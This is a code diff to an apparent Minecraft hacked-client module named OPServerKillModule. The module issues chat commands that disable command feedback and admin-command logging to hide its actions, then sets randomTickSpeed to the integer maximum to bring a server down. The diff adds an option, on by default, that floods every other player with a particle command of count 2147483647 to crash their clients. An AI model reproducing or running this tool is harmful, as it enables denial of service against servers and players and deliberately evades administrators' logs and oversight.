@@ -33,6 +33,12 @@ public class OPServerKillModule extends Module {
             .defaultValue(true)
             .build()
     );
+    private final Setting<Boolean> crashOtherPlayers = sgGeneral.add(new BoolSetting.Builder()
+            .name("crash-other-players")
+            .description("Crashes everyone else's minecraft client. Don't forget to enable Anti Crash in Rejects!")
+            .defaultValue(true)
+            .build()
+    );
     private final Setting<Integer> tickdelay = sgGeneral.add(new IntSetting.Builder()
             .name("Tick Delay")
             .description("The delay between commands sent.")
@@ -43,10 +49,10 @@ public class OPServerKillModule extends Module {
     private final Setting<Integer> killvalue = sgGeneral.add(new IntSetting.Builder()
             .name("randomTickSpeed (kill value)")
             .description("This is what kills server. Max value is best.")
-            .defaultValue(999999999)
+            .defaultValue(2147483647)
             .min(0)
-                    .max(999999999)
-                    .sliderRange(0, 999999999)
+            .max(2147483647)
+            .sliderRange(0, 2147483647)
             .build()
     );
     public OPServerKillModule() {
@@ -71,7 +77,7 @@ public class OPServerKillModule extends Module {
     @EventHandler
     public void onTick(TickEvent.Pre event) {
         ticks++;
-        if (sendCommandFeedback.get() && logAdminCommands.get()){
+        if (sendCommandFeedback.get() && logAdminCommands.get() && !crashOtherPlayers.get()){
             if (ticks == 1*tickdelay.get()){ //prevent people from seeing the commands being executed
                 ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
             }
@@ -81,37 +87,82 @@ public class OPServerKillModule extends Module {
             if (ticks == 3*tickdelay.get()){ //kill server
                 ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
             }
-            if (ticks > 3*tickdelay.get()){ //kill server
+            if (ticks > 3*tickdelay.get()){
                 toggle();
                 error("Server Killed.");
             }
-        } else if (!sendCommandFeedback.get() && logAdminCommands.get()){
+        } else if (!sendCommandFeedback.get() && logAdminCommands.get() && !crashOtherPlayers.get()){
             if (ticks == 1*tickdelay.get()){
                 ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
             }
             if (ticks == 2*tickdelay.get()){
                 ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
             }
-            if (ticks > 2*tickdelay.get()){ //kill server
+            if (ticks > 2*tickdelay.get()){
                 toggle();
                 error("Server Killed.");
             }
-        } else if (sendCommandFeedback.get() && !logAdminCommands.get()){
+        } else if (sendCommandFeedback.get() && !logAdminCommands.get() && !crashOtherPlayers.get()){
             if (ticks == 1*tickdelay.get()){
                 ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
             }
             if (ticks == 2*tickdelay.get()){
                 ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
             }
-            if (ticks > 2*tickdelay.get()){ //kill server
+            if (ticks > 2*tickdelay.get()){
                 toggle();
                 error("Server Killed.");
             }
-        } else if (!sendCommandFeedback.get() && !logAdminCommands.get()){
+        } else if (!sendCommandFeedback.get() && !logAdminCommands.get() && !crashOtherPlayers.get()){
             if (ticks == 1*tickdelay.get()){
                 ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
             }
-            if (ticks > 1*tickdelay.get()){ //kill server
+            if (ticks > 1*tickdelay.get()){
+                toggle();
+                error("Server Killed.");
+            }
+        } else if (!sendCommandFeedback.get() && logAdminCommands.get() && crashOtherPlayers.get()){
+            if (ticks == 1*tickdelay.get()){
+                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
+            }
+            if (ticks == 2*tickdelay.get()){ //crash players
+                ChatUtils.sendPlayerMsg("/execute at @a[distance=.1..] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[distance=.1..]");
+            }
+            if (ticks == 3*tickdelay.get()){
+                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
+            }
+            if (ticks > 3*tickdelay.get()){
+                toggle();
+                error("Server Killed.");
+            }
+        } else if (sendCommandFeedback.get() && !logAdminCommands.get() && crashOtherPlayers.get()){
+            if (ticks == 1*tickdelay.get()){ //prevent people from seeing the commands being executed
+                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
+            }
+            if (ticks == 2*tickdelay.get()){ //crash players
+                ChatUtils.sendPlayerMsg("/execute at @a[distance=.1..] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[distance=.1..]");
+            }
+            if (ticks == 3*tickdelay.get()){
+                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
+            }
+            if (ticks > 3*tickdelay.get()){
+                toggle();
+                error("Server Killed.");
+            }
+        } else if (sendCommandFeedback.get() && logAdminCommands.get() && crashOtherPlayers.get()){
+            if (ticks == 1*tickdelay.get()){ //prevent people from seeing the commands being executed
+                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
+            }
+            if (ticks == 2*tickdelay.get()){ //prevent console logging the command to cover up tracks
+                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
+            }
+            if (ticks == 3*tickdelay.get()){ //crash players
+                ChatUtils.sendPlayerMsg("/execute at @a[distance=.1..] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[distance=.1..]");
+            }
+            if (ticks == 4*tickdelay.get()){ //kill server
+                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
+            }
+            if (ticks > 4*tickdelay.get()){ //kill server
                 toggle();
                 error("Server Killed.");
             }
